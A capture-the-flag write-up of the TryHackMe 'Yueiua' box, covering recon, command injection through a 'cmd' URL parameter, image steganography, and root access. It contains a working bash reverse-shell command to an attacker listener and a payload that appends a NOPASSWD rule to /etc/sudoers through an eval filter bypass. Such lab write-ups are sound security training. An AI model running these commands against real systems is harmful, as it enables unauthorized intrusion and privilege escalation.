# Yueiua — TryHackMe Writeup

**Target:** `TARGET_IP` (10.129.177.253 at time of solve)
**OS:** Linux (Ubuntu 20.04)
**Difficulty:** Easy
**Tech stack:** Apache 2.4.41, custom PHP
**Exploit chain:** URL-parameter OS command injection  `www-data` shell  base64 passphrase + image steghide  SSH as `deku`  sudo bash-eval filter bypass  `/etc/sudoers` append  root

---

## Attack Chain Overview

```
nmap  22/tcp OpenSSH 8.2p1, 80/tcp Apache 2.4.41
    
whatweb  email info@yuei.ac.jp (user hint)
    
feroxbuster  /assets/index.php
    
cmd=whoami  base64("www-data")  OS command injection
    
Reverse shell via /usr/bin/bash -c (URL-encoded)
    
cd /Hidden_Content  passphrase.txt (base64  AllmightForEver!!!)
    
wget /assets/images/oneforall.jpg  file says "data"
    
exiftool  PNG magic corrupted  printf '\xFF\xD8' | dd  fix JPEG magic
    
steghide extract  creds.txt  deku SSH creds
    
ssh deku@$TARGET
    
sudo -l  (ALL) /opt/NewComponent/feedback.sh
    
feedback.sh eval blacklist  '>' redirection not blocked
    
Payload: "deku ALL=NOPASSWD: ALL >> /etc/sudoers"
    
sudo su -  root.txt
```

---

## Table of Contents
1. [Reconnaissance](#1-reconnaissance)
2. [Web Enumeration](#2-web-enumeration)
3. [Initial Access — URL-Parameter Command Injection](#3-initial-access--url-parameter-command-injection)
4. [Post-Exploitation (`www-data`)](#4-post-exploitation-www-data)
5. [User — Image Steganography Loot](#5-user--image-steganography-loot)
6. [Privilege Escalation — Bash Eval Filter Bypass](#6-privilege-escalation--bash-eval-filter-bypass)
7. [Root Flag](#7-root-flag)
8. [Key Takeaways](#8-key-takeaways)

---

## 1. Reconnaissance

```bash
# What it does: run a full port discovery scan and service version enumeration.
# Why here: identify the attack surface, including SSH and the Apache web server hosting the U.A. High School site.
nmap -sS -p- -n -Pn --min-rate 5000 $TARGET -oA silent
nmap -sVC -p22,80 $TARGET -oA service
```

| Port | Service |
|------|---------|
| 22/tcp | OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 |
| 80/tcp | Apache httpd 2.4.41 (Ubuntu) — title *U.A. High School* |

See [nmap.md](../../../tools/recon/nmap.md).

---

## 2. Web Enumeration

```bash
whatweb http://$TARGET
# Email[info@yuei.ac.jp]     noted for later
# What it does: brute-force directories and files on the web server.
# Why here: discover the assets directory and any potential PHP entry points.
feroxbuster -u http://$TARGET -w /usr/share/wordlists/dirb/big.txt -x php,html
```

Interesting hit:
```
http://$TARGET/assets/index.php
```

Tools: [whatweb](../../../tools/recon/whatweb.md), [feroxbuster](../../../tools/fuzz/feroxbuster.md).

---

## 3. Initial Access — URL-Parameter Command Injection

Full technique: [url-param-command-injection.md](../../../exploits/web-rce/url-param-command-injection.md).

```bash
# What it does: test the suspected 'cmd' parameter for OS command injection.
# Why here: verify the vulnerability by executing 'whoami' and decoding the base64-encoded response.
curl "http://$TARGET/assets/index.php?cmd=whoami"
# d3d3LWRhdGEK
# What it does: decode the base64 response from the injection point.
# Why here: confirm the user context of the command execution (www-data).
echo 'd3d3LWRhdGEK' | base64 -d
# www-data
```

Response is base64-wrapped. Reverse shell:
```bash
# Attacker
# What it does: set up a netcat listener.
# Why here: receive the reverse shell connection from the target.
nc -lvnp 4444

# Target (URL-encoded)
# What it does: trigger a bash reverse shell via the command injection point.
# Why here: establish an interactive foothold as the www-data user.
curl "http://$TARGET/assets/index.php?cmd=/usr/bin/bash%20-c%20'/usr/bin/bash%20-i%20>%26%20/dev/tcp/$LHOST/4444%200>%261'"
```

```bash
# What it does: upgrade the reverse shell to a full PTY.
# Why here: enable full terminal interactivity for efficient local enumeration.
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## 4. Post-Exploitation (`www-data`)

Standard [Linux enumeration](../../../playbooks/enumeration/linux.md).

```bash
# What it does: displays a file in the terminal.
# Why here: read configuration, credentials, proof or flags.
cat /etc/passwd | grep bash
# root:x:0:0:root:/root:/bin/bash
# deku:x:1000:1000:deku:/home/deku:/bin/bash
# ubuntu:x:1001:1002:Ubuntu:/home/ubuntu:/bin/bash

# What it does: searches the filesystem with the specified filters.
# Why here: locate credentials, binaries, configs or writable paths.
find / -type f -executable -user deku 2>/dev/null
# /opt/NewComponent/feedback.sh      pin for privesc
```

Hidden directory from `cd /`:
```bash
# What it does: lists directory contents.
# Why here: verificar archivos, permisos o loot en la ruta actual.
ls /
# ... Hidden_Content ...
# What it does: displays a file in the terminal.
# Why here: read configuration, credentials, proof or flags.
cat /Hidden_Content/passphrase.txt
# QWxsbWlnaHRGb3JFdmVyISEh
# What it does: decodes or encodes Base64 data.
# Why here: convertir loot codificado en texto utilizable.
echo 'QWxsbWlnaHRGb3JFdmVyISEh' | base64 -d
# AllmightForEver!!!
```

---

## 5. User — Image Steganography Loot

Full technique: [steganography-image-loot.md](../../../techniques/stego/steganography-image-loot.md).

```bash
# What it does: downloads the specified URL to disk.
# Why here: bring evidence, payloads or files needed to advance.
wget http://$TARGET/assets/images/oneforall.jpg
# What it does: identifies file type and metadata.
# Why here: choose the correct parser or technique.
file oneforall.jpg
# oneforall.jpg: data              magic is broken

# What it does: inspects or extracts hidden content/metadata from a file.
# Why here: recover clues or credentials hidden in assets.
exiftool oneforall.jpg
# Warning: PNG image did not start with IHDR
```

Restore a JPEG magic (`steghide` only handles JPEG/BMP/WAV):
```bash
printf '\xFF\xD8' | dd of=oneforall.jpg bs=1 count=2 conv=notrunc
```

Extract with the passphrase from §4:
```bash
# What it does: attempt to extract hidden data from the image with steghide.
# Why here: recover the credentials file hidden in the JPG using the previously discovered passphrase.
steghide extract -sf oneforall.jpg
# Enter passphrase: AllmightForEver!!!
# wrote extracted data to "creds.txt"

# What it does: display the extracted credentials.
# Why here: recover the SSH password for the user 'deku'.
cat creds.txt       # deku SSH credentials
# What it does: connect to the target via SSH as 'deku'.
# Why here: escalate from the web user (www-data) to a system user with more privileges.
ssh deku@$TARGET
# What it does: read the user flag.
# Why here: complete the first phase of the challenge.
cat /home/deku/user.txt
```

Tools: [exiftool](../../../tools/web/exiftool.md), [steghide](../../../tools/stego/steghide.md), [wget](../../../tools/web/wget.md).

---

## 6. Privilege Escalation — Bash Eval Filter Bypass

Full technique: [bash-eval-filter-bypass.md](../../../privesc/linux/bash-eval-filter-bypass.md).

```bash
# What it does: lists sudo privileges of the current or specified user.
# Why here: encontrar comandos permitidos para escalar privilegios.
sudo -l
# (ALL) /opt/NewComponent/feedback.sh
# What it does: displays a file in the terminal.
# Why here: read configuration, credentials, proof or flags.
cat /opt/NewComponent/feedback.sh
```

```bash
#!/bin/bash
read feedback
if [[ "$feedback" != *"\`"* && "$feedback" != *")"* && "$feedback" != *"\$("* \
    && "$feedback" != *"|"* && "$feedback" != *"&"* && "$feedback" != *";"* \
    && "$feedback" != *""* && "$feedback" != *"!"* && "$feedback" != *"\\"* ]]; then
    eval "echo $feedback"
fi
```

Blacklist covers command substitution but **not `>>`**. Payload:

```bash
# What it does: execute the sudo-allowed feedback.sh script.
# Why here: leverage the eval-injection vulnerability to append a NOPASSWD entry to the sudoers file.
sudo /opt/NewComponent/feedback.sh
# Enter your feedback:
deku ALL=NOPASSWD: ALL >> /etc/sudoers
```

`eval "echo deku ALL=NOPASSWD: ALL >> /etc/sudoers"` — the shell expands `>>` and appends the line as root.

```bash
# What it does: lists sudo privileges of the current or specified user.
# Why here: encontrar comandos permitidos para escalar privilegios.
sudo -l              # deku may now run anything
sudo su -
```

---

## 7. Root Flag

```bash
# What it does: displays a file in the terminal.
# Why here: read configuration, credentials, proof or flags.
cat /root/root.txt
```

---

## 8. Key Takeaways

- `file <x>` before any image tool — extension and even metadata lie; magic bytes don't.
- Corrupted magic bytes are a red flag, not a broken file. Fix with `printf '\xXX\xYY' | dd of=<file> bs=1 count=N conv=notrunc` and try the tool again.
- `exiftool` first, `steghide` second. Passphrase is nearly always elsewhere on the box (`grep -rEi 'pass' /home /opt /tmp`).
- Blacklist-based shell filters that allow `>` / `>>` are trivially bypassable — redirect into `/etc/sudoers`, `/root/.ssh/authorized_keys`, or any cron helper.
- On base64-wrapped RCE endpoints, pipe every response through `base64 -d` immediately — don't waste time troubleshooting "empty" responses.

---

## Related Notes
- [url-param-command-injection.md](../../../exploits/web-rce/url-param-command-injection.md) — initial RCE
- [steganography-image-loot.md](../../../techniques/stego/steganography-image-loot.md) — user flag chain
- [bash-eval-filter-bypass.md](../../../privesc/linux/bash-eval-filter-bypass.md) — root privesc
- [linux-enumeration.md](../../../playbooks/enumeration/linux.md) — post-foothold checklist
- [nmap](../../../tools/recon/nmap.md), [whatweb](../../../tools/recon/whatweb.md), [feroxbuster](../../../tools/fuzz/feroxbuster.md) — recon
- [curl](../../../tools/web/curl.md), [netcat](../../../tools/pivot/netcat.md) — exploitation
- [exiftool](../../../tools/web/exiftool.md), [steghide](../../../tools/stego/steghide.md), [wget](../../../tools/web/wget.md) — stego loot
